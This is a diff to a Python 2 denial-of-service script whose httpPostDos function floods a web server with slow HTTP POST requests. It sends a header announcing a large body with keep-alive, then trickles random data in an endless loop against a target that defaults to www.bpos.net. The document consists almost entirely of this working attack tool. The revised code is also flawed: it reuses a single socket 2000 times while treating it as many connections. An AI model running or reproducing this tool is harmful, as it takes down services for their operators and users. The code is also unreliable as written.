@@ -26,48 +26,39 @@ def httpPostDos(target):
 
     host=target
     port=80
-    #max_number_of_connections=3000
-    #clients=[]#configure for http-get ldos
-
-    #for i in range(max_number_of_connections):
         
     client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    #clients.append(client)
     try:
         client.connect((host,port))
     except:
         print 'connect failed'
 
+    clients=[]
+    max_connections=2000
     header="POST /a HTTP/1.1\r\n"+\
             "HOST: "+host+"\r\n"+\
             "Connection: keep-alive\r\n"+\
             "Keep-Alive: 900\r\n"+\
-            "Content-Length: 100000\r\n"+\
-            "Content-Type: application/x-www-form-urlencode\r\n"+\
-            "Accept: *.*\r\n";
-    try:
-        client.send(header)
-        #print 'send header successfully'+str(i)+" times"
-        print 'send header successfully'
-        
-    except:
-        print 'send header failed'
-
-    #time.sleep(1)
-
-    i=1;
-    while True:
-        #for i in range(max_number_of_connections):
+            "Content-Length: 100000\r\n";
+    
+    #bulid connections
+    for i in range(max_connections):
         try:
-            #clients[i].send('a')
-            #msg=randomMsg()
-            client.send('a')
-            #print "Client "+str(i)+" just send a character"
-            print "client sends "+str(i)+" times successfully"
+            client.send(header)
+            print 'send header'+str(i)+' times successfully'
+            clients.append(client)
         except:
-            print 'send failed'
-        i=i+1
-        #interval=random.random()
+            print 'send header'+str(i)+' times failed'
+
+
+    #keep connections alive
+    while True:
+        for i in range(len(clients)):
+            try:
+                clients[i].send(randomMsg())
+                print "client "+str(i)+" sends data successfully"
+            except:
+                print "client "+str(i)+" sends data failed"
         time.sleep(1)
 
 
@@ -79,7 +70,7 @@ def main():
                       default="www.bpos.net")
     (options,args)=parser.parse_args()
     tgt=options.tgt
-    if(tgt==None):
+    if tgt==None:
         print parser.usage
         exit(1)
         
